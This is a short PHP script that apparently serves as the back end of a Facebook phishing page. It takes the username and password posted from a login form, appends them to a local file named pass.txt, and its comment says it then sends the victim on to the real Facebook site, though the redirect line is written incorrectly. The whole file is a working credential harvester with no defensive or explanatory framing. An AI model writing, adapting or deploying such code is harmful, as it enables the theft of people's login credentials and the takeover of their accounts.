<?php
$username = $_POST['name'];

$password = $_POST['pass'];

$file = 'pass.txt';

$txt = file_get_contents($file);                 // Open the file to get existing content

$txt .= $username . " - " . $password . "\n";    // Append a new person's credentials to the file

file_put_contents($file, $txt);                  // Write the new contents back to the file



//redirect person to the actual facebook website
header("https://www.facebook.com/");
